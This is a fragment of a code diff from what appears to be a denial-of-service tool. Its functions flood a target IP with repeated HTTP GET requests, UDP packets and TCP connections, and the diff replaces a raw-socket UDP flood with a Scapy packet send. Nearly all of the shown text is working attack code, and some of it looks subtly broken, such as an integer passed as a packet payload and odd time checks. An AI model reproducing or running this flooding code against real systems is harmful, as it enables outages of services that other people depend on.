@@ -298,20 +298,13 @@ def GET_attack(ip, port, secs):
         for _ in range(1500):
             requests.get(ip, headers=headers)
             scraper.get(ip, headers=headers)
-
+			
 def attack_udp(ip, port, secs, size):
-    data = random._urandom(size)
-    i = random.choice(["[*]","[!]","[#]"])
     end_time = secs
     while time.time() < end_time:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            addr = (str(ip), int(port))
-            s.sendto(data, addr)
-            print(i + " Sent!!!")
-        except:
-            print("[!] Error!!!")
+        send(IP(dst=ip)/UDP(dport=port, sport=port)/Raw(load=size))
 
+			
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
